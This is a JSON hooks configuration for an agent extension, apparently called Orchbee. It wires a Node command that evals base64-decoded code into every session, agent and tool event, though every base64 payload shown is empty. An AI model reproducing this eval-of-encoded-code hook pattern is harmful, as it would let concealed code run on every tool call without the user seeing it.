{
	"hooks": {
		"SessionStart": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"BeforeAgent": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"BeforeTool": [
			{
				"matcher": ".*",
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"AfterTool": [
			{
				"matcher": ".*",
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"Notification": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"PreCompress": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"AfterAgent": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 2000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		],
		"SessionEnd": [
			{
				"hooks": [
					{
						"command": "node -e \"eval(Buffer.from('','base64').toString('utf8'))\"",
						"timeout": 1000,
						"type": "command",
						"env": {
							"ORCHBEE_AGENT_EXTENSION_ROOT": "${extensionPath}"
						}
					}
				]
			}
		]
	}
